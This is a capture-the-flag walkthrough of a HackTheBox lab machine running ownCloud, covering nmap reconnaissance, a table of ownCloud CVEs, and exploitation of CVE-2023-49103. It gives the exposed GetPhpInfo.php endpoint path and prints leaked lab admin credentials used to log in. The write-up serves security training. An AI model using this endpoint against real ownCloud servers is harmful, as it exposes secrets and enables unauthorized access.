---
title: "Cloudy Walkthrough - HTB"
date: 2025-10-13 09:00:00 +0530
categories: [red-teaming]
tags:
- HTB
- Linux-Server
- Exploit
- Credential-Harvesting
- CVE-2023-49103
description: "Walkthrough of HTB's Cloudy machine"
---

## External Recon

### Open Port Enumeration

I started with a full port scan using **Nmap** to identify open services on the target.

```c
sudo nmap -T5  -sS -n -Pn --disable-arp-ping -p- 10.129.230.169 --max-retries 0
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-13 00:10 EDT
Warning: 10.129.230.169 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.129.230.169
Host is up (0.15s latency).
Not shown: 59167 closed tcp ports (reset), 6366 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 39.62 seconds
```

Scan Breakdown

- **`T5`**: Maximizes scan speed.
- **`sS`**: Conducts a SYN scan, initiating a TCP handshake without completing it for stealthiness.
- **`n`**: Disables DNS resolution, reducing the time taken.
- **`Pn`**: Skips host discovery, assuming the host is online.
- **`p-`**: Scans all 65535 ports.

Scan results indicated only two interesting services, so I proceeded to enumerate ports **22** and **8080** further.

Enumerating services over this port

### Aggressive Nmap Scan (Service & OS Detection)

To gather more detailed information about the open services and operating system, I ran an aggressive Nmap scan:

```c
sudo nmap -T5 -A --disable-arp-ping -p 22,8080 10.129.230.169                  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-13 00:15 EDT
Nmap scan report for cloudy.htb (10.129.230.169)
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Apache httpd
|_http-open-proxy: Proxy might be redirecting requests
| http-title: ownCloud
|_Requested resource was http://cloudy.htb:8080/login
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.0 - 5.4 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 (94%), Linux 5.0 - 5.5 (94%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), HP P2000 G3 NAS device (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

From this, it was clear that an **Apache server** hosted an **ownCloud** instance on port **8080**, accessible via the subdomain `cloudy.htb`

---

## Initial Access

Navigated to the website hosted at “cloud.htb”. (Note: since it's locally hosted by HackTheBox, we cannot access it directly without modifying `/etc/hosts` to point the domain to the target IP.). The website hosts a simple ownCloud login page:

![image.png]({{ '/assets/img/Cloudy/image.png' | relative_url }})

Since no credentials were available, the next step was to identify the application and check for known vulnerabilities.

## Understanding the Application

> ***ownCloud** is an open-source, self-hosted file-sync and sharing platform that allows individuals and organizations to create their own private cloud storage environment. Unlike commercial services such as Google Drive or Dropbox, ownCloud runs entirely on servers you control, giving you full ownership of both the infrastructure and the data. It provides a clean web interface, along with desktop and mobile clients, for uploading, syncing, and sharing files securely across devices. The software integrates with authentication systems like LDAP or Active Directory, supports encryption and versioning, and can be extended through apps for collaboration or external storage. In essence, ownCloud serves as the software layer that delivers cloud-like functionality while keeping all data and control within your own infrastructure.*

---
## Vulnerability Analysis

Based on enumeration and visible app endpoints, I investigated notable ownCloud vulnerabilities. The top candidate for immediate impact was **CVE-2023-49103** (information disclosure via a `GetPhpInfo.php` test file in the GraphAPI app). I checked for the presence of the GraphAPI test endpoint and attempted to retrieve `phpinfo()` output.

| **Severity** | **CVE ID** | **Description** | **Affected Components / Versions** | **Fixed In / Mitigation** |
| --- | --- | --- | --- | --- |
| 🔴 **Critical (CVSS 10.0)** | **CVE-2023-49103** | *Information Disclosure via `GetPhpInfo.php`* — exposed PHP environment details including admin credentials, mail server configs, and API keys. | GraphAPI app 0.2.x < 0.2.1 / 0.3.x < 0.3.1 | Remove `GetPhpInfo.php` and update GraphAPI to ≥ 0.3.1 or core ≥ 10.13.3 |
| 🔴 **Critical (CVSS 9.8)** | **CVE-2023-49105** | *WebDAV API Authentication Bypass* — attackers could access, modify, or delete files by exploiting improper authentication checks. | Core 10.6.0 → 10.13.0 | Upgrade ownCloud Core to ≥ 10.13.3 |
| 🔴 **Critical (CVSS 9.8)** | **CVE-2023-49104** | *OAuth2 Redirect Validation Bypass* — attacker could redirect authorization callbacks to malicious domains, leading to credential theft. | OAuth2 app < 0.6.1 | Update OAuth2 app to ≥ 0.6.1 |
| 🟠 **High (CVSS 7.5)** | **CVE-2024-26321** | *Pre-signed URL Authentication Bypass* — knowledge of username + path could allow unauthorized file access via crafted URLs. | ownCloud Infinite Scale < 4.0.6 | Upgrade to ≥ 4.0.6 |
| 🟠 **Medium (CVSS 5.3)** | **CVE-2024-37012** | *Server-Side Request Forgery (SSRF)* in the Federated Sharing API — attacker could probe internal services or cause DoS. | Core < 10.15.0 | Upgrade to ≥ 10.15.0 |

**Key evidence and reasoning**

- The `graphapi` app often includes a test endpoint that, when left in production, exposes `phpinfo()` output.
- `phpinfo()` output commonly contains environment variables and keys which can include admin credentials or other secret strings.

## Exploitation & Gaining Access

Checking if the software is vulnerable to “CVE-2023-49103”

> The vulnerability allows an unauthenticated attacker to leak sensitive information via the output of the PHP function `phpinfo`, when targeting the URI endpoint `/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php`. This output will include environment variables which may hold secrets, such as user names or passwords that are supplied to the ownCloud system.
> 

The [POC](https://github.com/d0rb/CVE-2023-49103/blob/main/PoC.py) tells us that “phpinfo” can be leaked at “/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css”. 

Visiting the endpoint returned a `phpinfo()` page, confirming the test file was present and accessible. 

![image.png]({{ '/assets/img/Cloudy/image%201.png' | relative_url }})

Extracted credential snippet

```c
<tr><td class="e">OWNCLOUD_ADMIN_USERNAME </td><td class="v">admin </td></tr>
<tr><td class="e">OWNCLOUD_ADMIN_PASSWORD </td><td class="v">t6wNT2ShvmCnvjC </td></tr>
```

Using the leaked credentials, I logged into the ownCloud portal as the admin user. The admin web UI was accessible and allowed browsing of stored files.

Screenshot after logging in:

![image.png]({{ '/assets/img/Cloudy/image%202.png' | relative_url }})

Accessing the flag at private folder 


## References:

[https://github.com/d0rb/CVE-2023-49103](https://github.com/d0rb/CVE-2023-49103)

## Disclaimer

*The techniques and tools discussed in this walkthrough are intended solely for educational purposes and to help improve cybersecurity awareness. Please conduct any penetration testing activities only on systems that you own or have explicit permission to test. Unauthorized access to computer systems is illegal and punishable by law. The author does not take responsibility for any misuse of the information provided*